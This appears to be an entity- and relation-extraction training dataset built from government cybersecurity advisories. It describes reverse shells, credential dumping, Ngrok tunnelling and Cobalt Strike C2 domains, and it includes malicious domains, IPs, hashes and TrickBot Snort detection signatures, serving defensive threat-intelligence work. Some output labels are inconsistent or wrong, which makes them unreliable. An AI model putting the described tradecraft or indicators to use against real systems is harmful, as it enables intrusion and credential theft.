{"instruction": "When executed, it will attempt to connect to xegroups[.]com or xework[.]com to obtain the IP address of the C2 server and port number for unencrypted communication. SortVistaCompat Base64 encoded payload dropped from Multi-OS_ReverseShell.exe. This file receives the C2 IP and port from xework[.]com. When the TA2 malware is executed a DLL file drops an executable (XEReverseShell.exe) that attempts to pull a C2 IP address and port number from xework[.]com or xegroups[.]com. If no port or IP address is found, the program will exit. If a port and IP address are found, the program will establish a listener and wait for further commands. If communication is established between the TA2 malware and the C2: The malware will identify the operating system (Windows or Linux) and create the appropriate shell (cmd or bash), sending system information back to the C2.", "input": null, "output": "Named Entities: (xegroups[.]com, Domain), (xework[.]com, Domain), (Multi-OS_ReverseShell.exe, file), (XEReverseShell.exe, file), (TA2 malware, malware), (C2 server, tool)\nRelationships: (Multi-OS_ReverseShell.exe, dropped from, XEReverseShell.exe), (XEReverseShell.exe, receives from, xework[.]com), (TA2 malware, establish, C2 server)"}
{"instruction": "The team used domain fronting [T1090.004] to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating. This technique, which also leverages CDNs, allows the beacon to appear to connect to third-party domains, such as nytimes.com, when it is actually connecting to the team\u2019s redirect server. Phase II: Red Team Measurable Events Activity The red team executed 13 measurable events designed to provoke a response from the people, processes, and technology defending the organization\u2019s network. See Table 1 for a description of the events, the expected network defender activity, and the organization\u2019s actual response. Table 1: Measurable Events Measurable Event Description MITRE ATT&CK Technique(s) Expected Detection Points Expected Network Defender Reactions Reported Reactions Internal Port Scan Launch scan from inside the network from a previously gained workstation to enumerate ports on target workstation, server, and domain controller system(s). Network Service Discovery [T1046]", "input": null, "output": "Named Entities: (nytimes.com, Domain), (Red Team, attacker)\nRelationships: No related relations."}
{"instruction": "Identify source of change Verify change with system owner Develop response plan None Workstation Admin Lateral Movement\u2014Workstation to Workstation Use a previously compromised workstation admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on several target Workstations. Valid Accounts: Domain Accounts [T1078.002] Remote Services: SMB/Windows Admin Shares, Sub-technique [T1021.002] Create or Modify System Process: Windows Service [T1543.003] Windows Event Logs Detect account compromise Analyze compromised host Develop response plan None Domain Admin Lateral Movement\u2014Workstation to Domain Controller Use a previously compromised domain admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on a target DC. Valid Accounts: Domain Accounts [T1078.002] Remote Services: SMB/Windows Admin Shares, Sub-technique [T1021.002] Create or Modify System Process: Windows Service [T1543.003] Windows Event Logs Detect account compromise Triage compromised host Develop response plan None Malicious Traffic Generation\u2014Domain Controller to External Host", "input": null, "output": "Named Entities: (Workstation Admin, attacker), (Domain Admin, attacker)\nRelationships: No related relations."}
{"instruction": "Technical Details Overview In October 2022, CISA used trusted third-party reporting, to conduct retrospective analysis of EINSTEIN\u2014a federal civilian executive branch (FCEB)-wide intrusion detection system (IDS) operated and monitored by CISA\u2014and identified suspected malicious activity on two FCEB networks: In mid-June 2022, malicious actors sent a phishing email containing a phone number to an FCEB employee\u2019s government email address. The employee called the number, which led them to visit the malicious domain, myhelpcare[.]online. In mid-September 2022, there was bi-directional traffic between an FCEB network and myhelpcare[.]cc.", "input": null, "output": "Named Entities: (EINSTEIN, tool), (IDS, tool), (phishing email, threat type), (myhelpcare[.]online, Domain), (myhelpcare[.]cc, Domain)\nRelationships: No related relations."}
{"instruction": "CISA has observed that multiple first-stage domain names follow naming patterns used for IT help/support themed social-engineering, e.g., hservice[.]live, gscare[.]live, nhelpcare[.]info, deskcareme[.]live, nhelpcare[.]cc). According to Silent Push, some of these malicious domains impersonate known brands such as, Norton, GeekSupport, Geek Squad, Amazon, Microsoft, McAfee, and PayPal.[1] CISA has also observed that the first-stage malicious domain linked in the initial phishing email periodically redirects to other sites for additional redirects and downloads of RMM software. Use of Remote Monitoring and Management Tools", "input": null, "output": "Named Entities: (hservice[.]live, Domain), (gscare[.]live, Domain), (nhelpcare[.]info, Domain), (deskcareme[.]live, Domain), (nhelpcare[.]cc, Domain), (RMM software, tool)\nRelationships: No related relations."}
{"instruction": "Summary Actions to take today to mitigate cyber threats from ransomware: \u2022 Prioritize remediating known exploited vulnerabilities. \u2022 Train users to recognize and report phishing attempts. \u2022 Enable and enforce phishing-resistant multifactor authentication. Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.", "input": null, "output": "Named Entities: (ransomware, threat type), (Cybersecurity Advisory, tool), (stopransomware.gov, Domain)\nRelationships: (multifactor authentication, enable), (multifactor authentication, enforce)"}
{"instruction": "After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account DefaultAccount [T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host. Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.]sh server associated with 144.76.136[.]153. The actors downloaded the following tools: PsExec \u2013 a Microsoft signed tool for system administrators. Mimikatz \u2013 a credential theft tool. Ngrok \u2013 a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at *.ngrok[.]io. CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments. Ngrok is known to be used for malicious purposes.[1]", "input": null, "output": "Named Entities: (XMRig, tool), (transfer[.]sh, Domain), (144.76.136[.]153, IP), (PsExec, tool), (Mimikatz, tool), (Ngrok, tool)\nRelationships: (actors, download, PsExec), (actors, download, Mimikatz), (actors, download, Ngrok)"}
{"instruction": "The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account [T1136.002]. Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network. Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files. The threat actors were able to implant Ngrok on multiple hosts to ensure Ngrok\u2019s persistence should they lose access to a machine during a routine reboot. The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to tunnel.us.ngrok[.]com and korgn.su.lennut[.]com (the prior domain in reverse). It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as *.ngrok[.]com, *.ngrok[.]io, ngrok.*.tunnel[.]com, or korgn.*.lennut[.]com.", "input": null, "output": "Named Entities: (Mimikatz, tool), (VDI-KMS, tool), (Windows Defender, tool), (Ngrok, tool), (tunnel.us.ngrok[.]com, Domain), (korgn.su.lennut[.]com, Domain)\nRelationships: (Mimikatz, execute on, VDI-KMS), (actors, disable, Windows Defender), (actors, implant, Ngrok)"}
{"instruction": "Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources. Actions to take today to mitigate cyber threats from ransomware: \u2022 Prioritize and remediate known exploited vulnerabilities. \u2022 Train users to recognize and report phishing attempts. \u2022 Enable and enforce multifactor authentication.", "input": null, "output": "Named Entities: (ransomware, threat type), (stopransomware.gov, Domain)\nRelationships: No related relations."}
{"instruction": "Protective Controls and Architecture Identify, detect, and investigate abnormal activity that may indicate lateral movement by a threat actor, ransomware, or other malware. Use network monitoring tools and host-based logs and monitoring tools, such as an endpoint detection and response (EDR) tool. EDR tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. Implement a firewall and configure it to block Domain Name System (DNS) responses from outside the enterprise network or drop Internet Control Message Protocol (ICMP) packets. Review which admin services need to be accessible externally and allow those explicitly, blocking all others by default. U.S. Defense Industrial Base organizations may sign up for the NSA Cybersecurity Collaboration Center\u2019s Protective Domain Name System (PDNS) services. Enable web application firewalls to mitigate application-level DDoS attacks.", "input": null, "output": "Named Entities: (Protective Controls and Architecture, tool), (ransomware, threat type), (network monitoring tools, tool), (host-based logs and monitoring tools, tool), (endpoint detection and response (EDR) tool, tool), (firewall, tool), (NSA Cybersecurity Collaboration Center\u2019s Protective Domain Name System (PDNS) services, tool), (web application firewalls, tool), (application-level DDoS attacks, threat type)\nRelationships: (web application firewalls, mitigate, application-level DDoS attacks)"}
{"instruction": "If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State\u2019s (DOS) Rewards for Justice program. You may be eligible for a reward of up to $10 million, which DOS is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact +1-202-702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details refer to rewardsforjustice.net. Click here for a PDF version of this report.", "input": null, "output": "Named Entities: (state-sponsored Russian cyber operations, attacker), (Department of State\u2019s (DOS) Rewards for Justice program, tool), (Computer Fraud and Abuse Act (CFAA), threat type), (rewardsforjustice.net, Domain)\nRelationships: No related relations."}
{"instruction": "OS Credential Dumping: NTDS [T1003.003] Valid Accounts: Domain Accounts [T1078.002] Threat actors logged into a victim\u2019s VPN server and connected to the domain controllers, from which they exfiltrated credentials and exported copies of the AD database ntds.dit. Initial Access [TA0001] Privilege Escalation [TA0004] Collection [TA0009] Valid Accounts: Cloud Accounts [T1078.004] Data from Information Repositories: SharePoint [T1213.002] In one case, the actors used valid credentials of a global admin account within the M365 tenant to log into the administrative portal and change permissions of an existing enterprise application to give read access to all SharePoint pages in the environment, as well as tenant user profiles and email inboxes. Initial Access [TA0001] Collection [TA0009] Valid Accounts: Domain Accounts [T1078.002] Email Collection [T1114] In one case, the threat actors used legitimate credentials to exfiltrate emails from the victim's enterprise email system. Persistence [TA0003] Lateral Movement [TA0008] Valid Accounts [T1078]", "input": null, "output": "Named Entities: (VPN server, tool), (domain controllers, tool), (AD database ntds.dit, file), (administrative portal, tool), (enterprise application, tool), (SharePoint pages, tool), (tenant user profiles, tool), (email inboxes, tool), (enterprise email system, tool)\nRelationships: (VPN server, tool, domain controllers), (domain controllers, tool, AD database ntds.dit), (administrative portal, tool, enterprise application), (enterprise application, tool, SharePoint pages), (enterprise application, tool, tenant user profiles), (enterprise application, tool, email inboxes)"}
{"instruction": "Rewards for Justice Program\nIf you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State\u2019s Rewards for Justice Program. You may be eligible for a reward of up to $10 million, which the Department is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact (202) 702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details, refer to rewardsforjustice.net.", "input": null, "output": "Named Entities: (Computer Fraud and Abuse Act (CFAA), threat type), (WhatsApp, tool), (Signal, tool), (Telegram, tool), (Tor-based tips line, tool), (Dark Web, tool), (rewardsforjustice.net, Domain)\nRelationships: (Tor-based tips line, located on, Dark Web)"}
{"instruction": "The ACSC recommends organizations implement eight essential mitigation strategies from the ACSC\u2019s Strategies to Mitigate Cyber Security Incidents as a cybersecurity baseline. These strategies, known as the \u201cEssential Eight,\u201d make it much harder for adversaries to compromise systems. Refer to the ACSC\u2019s practical guides on how to protect yourself against ransomware attacks and what to do if you are held to ransom at cyber.gov.au. Refer to NCSC-UK\u2019s guides on how to protect yourself against ransomware attacks and how to respond to and recover from them at ncsc.gov.uk/ransomware/home.", "input": null, "output": "Named Entities: (cyber.gov.au, Domain)\nRelationships: No related relations."}
{"instruction": "U.S. organizations should report compromises to CISA and the FBI. Australian organizations can visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents. Canadian organizations can report incidents by emailing CCCS at contact@cyber.gc.ca. New Zealand organizations can visit NCSC.govt.nz to report incidents. UK organizations can report a significant cyber security incident at ncsc.gov.uk/report-an-incident (monitored 24 hrs) or, for urgent assistance, call 03000 200 973. 4. Evaluate and apply other mitigations. A. Remain alert to changes from vendors for the software on the asset, and immediately apply updates to assets when notified by a vendor that their product has a patch for this vulnerability. Additionally, see CISA's GitHub repository for known affected products and patch information. CISA will continually update the repository as vendors release patches. B. Continue to monitor Log4J assets closely. Continually use signatures and indicators of compromise that may indicate exploitation.", "input": null, "output": "Named Entities: (cyber.gov.au, Domain), (NCSC.govt.nz, Domain)\nRelationships: No related relations."}
{"instruction": "U.S. organizations should report compromises to CISA and the FBI. Australian organizations can visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents. Canadian organizations can report incidents by emailing CCCS at contact@cyber.gc.ca. New Zealand organizations can visit NCSC.govt.nz to report incidents. UK organizations can report a significant cyber security incident at ncsc.gov.uk/report-an-incident (monitored 24 hrs) or, for urgent assistance, call 03000 200 973.", "input": null, "output": "Named Entities: (cyber.gov.au, Domain), (NCSC.govt.nz, Domain)\nRelationships: No related relations."}
{"instruction": "Resources\nFor more information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.\nCISA\u2019s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident.\u00a0\nCISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.", "input": null, "output": "Named Entities: (ransomware, threat type), (StopRansomware.gov, Domain), (Ransomware Readiness Assessment, tool), (cyber hygiene services, tool)\nRelationships: (StopRansomware.gov, provide resources, ransomware)"}
{"instruction": "Ransomware Best Practices The FBI and CISA strongly discourage paying a ransom to criminal actors. Payment does not guarantee files will be recovered, nor does it ensure protection from future breaches. Payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of malware, and/or fund illicit activities. Regardless of whether you or your organization decide to pay the ransom, the FBI and CISA urge you to report ransomware incidents to CISA, a local FBI field office, or by filing a report with IC3 at IC3.gov. Doing so provides the U.S. Government with critical information needed to help victims, track ransomware attackers, hold attackers accountable under U.S. law, and share information to prevent future attacks. Information Requested", "input": null, "output": "Named Entities: (Ransomware, threat type), (IC3.gov, Domain)\nRelationships: (IC3.gov, report, Ransomware)"}
{"instruction": "Indicators of Compromise Table 1 lists indicators related to this spearphishing and intrusion campaign as of May 7, 2012, which are provided in this alert for historical completeness. Table 1: IOCs from Chinese Gas Pipeline Intrusion Campaign, 2011 to 2013 Type Indicator Filename Malware MD5:84873fae9cdecb84452fff9cca171004 ntshrui.dll Malicious email content, including any attachments and/or message body fpso.bigish[.]net Malware MD5:e12ce62cf7de42581c2fe1d7f36d521c ntshrui.dll User agent string Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727) User agent string Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Named pipe ssnp Possible command and control (C2) domain <xxx>.arrowservice[.]net Where xxx is the targeted company name abbreviation Malware MD5:7361a1f33d48802d061605f34bf08fb0 spoolsvd.exe Malware 5e6a033fa01739d9b517a468bd812162 AdobeUpdater.exe Malware e62afe2273986240746203f9d55496db ins.exe Malware ed92d1242c0017668b93a72865b0876b px.exe Malware 6818a9aef22c0c2084293c82935e84fe gh.exe Malware fcbbfadc992e265c351e54598a6f6dfb fslist.exe Malware 05476307f4beb3c0d9099270c504f055 u.exe Malware 54db65a27472c9f3126df5bf91a773ea slm.exe Malware a46a7045c0a3350c5a4c919fff2831a0 niu.exe Malware 60456fe206a87f5422b214369af4260e ccApp1.exe Malware d6eaadcbcf9ea9192db1bd5bb7462bf8 ntshrui.dll Malware 52294de74a80beb1e579e5bca7c7248a moonclient2.exe", "input": null, "output": "Named Entities: (spearphishing and intrusion campaign, threat type), (ntshrui.dll, file), (fpso.bigish[.]net, Domain), (spoolsvd.exe, file), (5e6a033fa01739d9b517a468bd812162, MD5), (AdobeUpdater.exe, file), (e62afe2273986240746203f9d55496db, MD5), (ins.exe, file), (ed92d1242c0017668b93a72865b0876b, MD5), (px.exe, file), (6818a9aef22c0c2084293c82935e84fe, MD5), (gh.exe, file), (fcbbfadc992e265c351e54598a6f6dfb, MD5), (fslist.exe, file), (05476307f4beb3c0d9099270c504f055, MD5), (u.exe, file), (54db65a27472c9f3126df5bf91a773ea, MD5), (slm.exe, file), (a46a7045c0a3350c5a4c919fff2831a0, MD5), (niu.exe, file), (60456fe206a87f5422b214369af4260e, MD5), (ccApp1.exe, file), (d6eaadcbcf9ea9192db1bd5bb7462bf8, MD5), (52294de74a80beb1e579e5bca7c7248a, MD5), (moonclient2.exe, file)\nRelationships: (spearphishing and intrusion campaign, related to, fpso.bigish[.]net), (spearphishing and intrusion campaign, related to, spoolsvd.exe), (spearphishing and intrusion campaign, related to, 5e6a033fa01739d9b517a468bd812162), (spearphishing and intrusion campaign, related to, AdobeUpdater.exe), (spearphishing and intrusion campaign, related to, e62afe2273986240746203f9d55496db), (spearphishing and intrusion campaign, related to, ins.exe), (spearphishing and intrusion campaign, related to, ed92d1242c0017668b93a72865b0876b), (spearphishing and intrusion campaign, related to, px.exe), (spearphishing and intrusion campaign, related to, 6818a9aef22c0c2084293c82935e84fe), (spearphishing and intrusion campaign, related to, gh.exe), (spearphishing and intrusion campaign, related to, fcbbfadc992e265c351e54598a6f6dfb), (spearphishing and intrusion campaign, related to, fslist.exe), (spearphishing and intrusion campaign, related to, 05476307f4beb3c0d9099270c504f055), (spearphishing and intrusion campaign, related to, u.exe), (spearphishing and intrusion campaign, related to, 54db65a27472c9f3126df5bf91a773ea), (spearphishing and intrusion campaign, related to, slm.exe), (spearphishing and intrusion campaign, related to, a46a7045c0a3350c5a4c919fff2831a0), (spearphishing and intrusion campaign, related to, niu.exe), (spearphishing and intrusion campaign, related to, 60456fe206a87f5422b214369af4260e), (spearphishing and intrusion campaign, related to, ccApp1.exe), (spearphishing and intrusion campaign, related to, d6eaadcbcf9ea9192db1bd5bb7462bf8), (spearphishing and intrusion campaign, related to, 52294de74a80beb1e579e5bca7c7248a), (spearphishing and intrusion campaign, related to, moonclient2.exe)"}
{"instruction": "Malicious email content, including any attachments and/or message body fni.itgamezone[.]net", "input": null, "output": "Named Entities: (fni.itgamezone[.]net, Domain)\nRelationships: No related relations."}
{"instruction": "Reset credentials after virtual private network (VPN) devices are upgraded and reconnected to the external network. Revoke and generate new VPN server keys and certificates (this may require redistributing VPN connection information to users). Disable Remote Desktop Protocol (RDP) if not required for legitimate business functions. Restrict VPN traffic to and from managed service providers (MSPs) using a dedicated VPN connection. Review and verify all connections between customer systems, service provider systems, and other client enclaves. Harden: Software Update [D3-SU] Detect: Network Traffic Analysis Connection Attempt Analysis [D3-CAA] Platform Monitoring [D3-PM] Process Analysis Process Spawn Analysis [D3-SPA] Process Lineage Analysis [D3-PLA] Valid Accounts [T1078]: Default Accounts [T1078.001] Domain Accounts [T1078.002] Chinese state-sponsored cyber actors have been observed: gaining credential access into victim networks by using legitimate, but compromised credentials to access OWA servers, corporate login portals, and victim networks.", "input": null, "output": "Named Entities: (VPN server keys and certificates, tool), (T1078, technique), (T1078.001, technique), (T1078.002, technique), (Chinese state-sponsored cyber actors, attacker)\nRelationships: No related ralations."}
{"instruction": "Chinese state-sponsored cyber actors have been observed conducting spearphishing campaigns that encourage engagement from the target audience. These emails may contain a malicious link or file that provide the cyber actor access to the victim\u2019s device after the user clicks on the malicious link or opens the attachment. Use an antivirus program, which may stop malicious code execution that cyber actors convince users to attempt to execute. Prevent unauthorized execution by disabling macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Microsoft Office suite applications. Use a domain reputation service to detect and block suspicious or malicious domains. Determine if certain categories of websites are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.", "input": null, "output": "Named Entities: (Chinese state-sponsored cyber actors, attacker), (spearphishing campaigns, threat type), (antivirus program, tool), (Office Viewer software, tool), (domain reputation service, tool)\nRelationships: (Chinese state-sponsored cyber actors, conduct, spearphishing campaigns)"}
{"instruction": "File Access Pattern Analysis [D3-FAPA] Isolate: Execution Isolation Executable Allowlisting [D3-EAL] Modify Authentication Process [T1556] Domain Controller Authentication [T1556.001] Chinese state-sponsored cyber actors were observed creating a new sign-in policy to bypass MFA requirements to maintain access to the victim network. Note: this technique also applies to Defense Evasion [TA0005] and Credential Access [TA0006]. Monitor for policy changes to authentication mechanisms used by the domain controller. Monitor for modifications to functions exported from authentication DLLs (such as cryptdll.dll and samsrv.dll). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts (for example, one account logged into multiple systems simultaneously, multiple accounts logged into the same machine simultaneously, accounts logged in at odd times or outside of business hours).", "input": null, "output": "Named Entities: (T1556, technique), (T1556.001, technique), (Chinese state-sponsored cyber actors, attacker), (TA0005, technique), (TA0006, technique), (cryptdll.dll, file), (samsrv.dll, file)\nRelationships: No related ralations."}
{"instruction": "Monitor process and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NDST.DIT. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Limit credential overlap across accounts and systems by training users and administrators not to use the same passwords for multiple accounts. Consider disabling or restricting NTLM. Consider disabling WDigest authentication. Ensure that domain controllers are backed up and properly secured (e.g., encrypt backups). Implement Credential Guard to protect the LSA secrets from credential dumping on Windows 10. This is not configured by default and requires hardware and firmware system requirements. Enable Protected Process Light for LSA on Windows 8.1 and Windows Server 2012 R2. Harden: Credential Hardening [D3-CH] Detect: Process Analysis File Access Pattern Analysis [D3-FAPA] System Call Analysis [D3-SCA] Isolate: Execution Isolation Hardware-based Process Isolation [D3-HBPI] Mandatory Access Control [D3-MAC]", "input": null, "output": "Named Entities: (NDST.DIT, file), (domain controllers, tool), (Credential Guard, tool), (Protected Process Light, tool), (Windows 8.1, tool), (Windows Server 2012 R2, tool)\nRelationships: No related relations."}
{"instruction": "Chinese state-sponsored cyber actors have been observed importing tools from GitHub or infected domains to victim networks. In some instances. Chinese state-sponsored cyber actors used the Server Message Block (SMB) protocol to import tools into victim networks. Perform ingress traffic analysis to identify transmissions that are outside of normal network behavior. Do not expose services and protocols (such as File Transfer Protocol [FTP]) to the Internet without strong business justification. Use signature-based network intrusion detection and prevention systems to identify adversary malware coming into the network. Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Non-Standard Port [T1571] Chinese state-sponsored cyber actors have been observed using a non-standard SSH port to establish covert communication channels with VPS infrastructure. Use signature-based network intrusion detection and prevention systems to identify adversary malware calling back to C2. Configure firewalls to limit outgoing traffic to only required ports based on the functions of that network segment.", "input": null, "output": "Named Entities: (Chinese state-sponsored cyber actors, attacker), (GitHub, tool), (infected domains, tool), (VPS infrastructure, tool), (C2, tool), (firewalls, tool)\nRelationships: (Chinese state-sponsored cyber actors, import, GitHub), (Chinese state-sponsored cyber actors, import, infected domains), (Chinese state-sponsored cyber actors, communicate with, VPS infrastructure)"}
{"instruction": "Cobalt Strike is a commercial penetration testing tool used to conduct red team operations.[4] It contains a number of tools that complement the cyber threat actor\u2019s exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners. The Cobalt Strike Beacon is the malicious implant that calls back to attacker-controlled infrastructure and checks for additional commands to execute on the compromised system [TA0011]. The configuration file for this Cobalt Strike Beacon implant contained communications protocols, an implant watermark, and the following hardcoded command and control (C2) domains: dataplane.theyardservice[.]com/jquery-3.3.1.min.woff2 cdn.theyardservice[.]com/jquery-3.3.1.min.woff2 static.theyardservice[.]com/jquery-3.3.1.min.woff2 worldhomeoutlet[.]com/jquery-3.3.1.min.woff2 The configuration file was encoded via an XOR with the key 0x2e and a 16-bit byte swap. For more information on the ISO file and Cobalt Strike Beacon implant, including IOCs, refer to Malware Analysis Report MAR-10339794-1.v1: Cobalt Strike Beacon.", "input": null, "output": "Named Entities: (Cobalt Strike, tool), (Cobalt Strike Beacon, malware), (TA0011, technique), (dataplane.theyardservice[.]com, Domain), (cdn.theyardservice[.]com, Domain), (static.theyardservice[.]com, Domain), (worldhomeoutlet[.]com, Domain)\nRelationships: (Cobalt Strike, complement, TA0011), (Cobalt Strike Beacon, call back to, attacker-controlled infrastructure)"}
{"instruction": "General Tradecraft Observations\nSVR cyber operators are capable adversaries. In addition to the techniques described above, FBI investigations have revealed infrastructure used in the intrusions is frequently obtained using false identities and cryptocurrencies. VPS infrastructure is often procured from a network of VPS resellers. These false identities are usually supported by low reputation infrastructure including temporary e-mail accounts and temporary voice over internet protocol (VoIP) telephone numbers. While not exclusively used by SVR cyber actors, a number of SVR cyber personas use e-mail services hosted on cock[.]li or related domains.\nThe FBI also notes SVR cyber operators have used open source or commercially available tools continuously, including Mimikatz\u2014an open source credential-dumping too\u2014and Cobalt Strike\u2014a commercially available exploitation tool.", "input": null, "output": "Named Entities: (SVR cyber operators, attacker), (cock[.]li, Domain), (Mimikatz, tool), (Cobalt Strike, tool)\nRelationships: (SVR cyber operators, use, Mimikatz), (SVR cyber operators, use, Cobalt Strike)"}
{"instruction": "Detection Signatures CISA developed the following snort signature for use in detecting network activity associated with TrickBot activity. alert tcp any [443,447] -> any any (msg:\"TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'example.com' (Hex)\"; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:\"|0b|example.com\"; fast_pattern:only; content:\"Global Security\"; content:\"IT Department\"; pcre:\"/(?:\\x09\\x00\\xc0\\xb9\\x3b\\x93\\x72\\xa3\\xf6\\xd2|\\x00\\xe2\\x08\\xff\\xfb\\x7b\\x53\\x76\\x3d)/\"; classtype:bad-unknown; metadata:service ssl,service and-ports;) alert tcp any any -> any $HTTP_PORTS (msg:\"TRICKBOT_ANCHOR:HTTP URI GET contains '/anchor'\"; sid:1; rev:1; flow:established,to_server; content:\"/anchor\"; http_uri; fast_pattern:only; content:\"GET\"; nocase; http_method; pcre:\"/^\\/anchor_?.{3}\\/[\\w_-]+\\.[A-F0-9]+\\/?$/U\"; classtype:bad-unknown; priority:1; metadata:service http;) alert tcp any $SSL_PORTS -> any any (msg:\"TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'C=XX, L=Default City, O=Default Company Ltd'\"; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:\"|31 0b 30 09 06 03 55 04 06 13 02|XX\"; nocase; content:\"|31 15 30 13 06 03 55 04 07 13 0c|Default City\"; nocase; content:\"|31 1c 30 1a 06 03 55 04 0a 13 13|Default Company Ltd\"; nocase; content:!\"|31 0c 30 0a 06 03 55 04 03|\"; classtype:bad-unknown; reference:url,www.virustotal.com/gui/file/e9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650e/detection; metadata:service ssl;)", "input": null, "output": "Named Entities: (TrickBot, malware), (example.com, Domain), (e9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650e, SHA256)\nRelationships: (TrickBot, contain, example.com), (e9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650e, detect, TrickBot)"}
{"instruction": "Further research revealed that a phishing email from a Celas LLC company (Phishing: Spearphishing Link [T1566.002]) recommended the trojanized cryptocurrency trading application to victims. The email provided a link to the Celas\u2019 website, celasllc[.]com (Acquire Infrastructure: Domain [T1583.001]), where the victim could download a Windows or macOS version of the trojanized application. The celasllc[.]com domain resolved to the following Internet Protocol (IP) addresses from May 29, 2018, to January 23, 2021. 45.199.63[.]220 107.187.66[.]103 145.249.106[.]19 175.29.32[.]160 185.142.236[.]213 185.181.104[.]82 198.251.83[.]27 208.91.197[.]46 209.99.64[.]18 The celasllc[.]com domain had a valid Sectigo (previously known as Comodo) Secure Sockets Layer (SSL) certificate (Obtain Capabilities: Digital Certificates [T1588.004]). The SSL certificate was \u201cDomain Control Validated,\u201d a weak security verification level that does not require validation of the owner\u2019s identity or the actual business\u2019s existence. Celas Trade Pro Application Analysis Windows Program", "input": null, "output": "Named Entities: (Celas LLC, attacker), (Phishing: Spearphishing Link, threat type), (celasllc[.]com, Domain), (45.199.63[.]220, IP), (107.187.66[.]103, IP), (145.249.106[.]19, IP), (175.29.32[.]160, IP), (185.142.236[.]213, IP), (185.181.104[.]82, IP), (198.251.83[.]27, IP), (208.91.197[.]46, IP), (209.99.64[.]18, IP), (Sectigo, tool), (SSL certificate, tool), (Comodo, tool), (Secure Sockets Layer, tool), (Celas Trade Pro Application, tool), (Windows Program, tool)\nRelationships: (Celas LLC, use, Phishing: Spearphishing Link), (Phishing: Spearphishing Link, domain, celasllc[.]com), (celasllc[.]com, IP, 45.199.63[.]220), (celasllc[.]com, IP, 107.187.66[.]103), (celasllc[.]com, IP, 145.249.106[.]19), (celasllc[.]com, IP, 175.29.32[.]160), (celasllc[.]com, IP, 185.142.236[.]213), (celasllc[.]com, IP, 185.181.104[.]82), (celasllc[.]com, IP, 198.251.83[.]27), (celasllc[.]com, IP, 208.91.197[.]46), (celasllc[.]com, IP, 209.99.64[.]18), (celasllc[.]com, tool, Sectigo), (Sectigo, tool, SSL certificate), (Celas Trade Pro Application, tool, Windows Program)"}
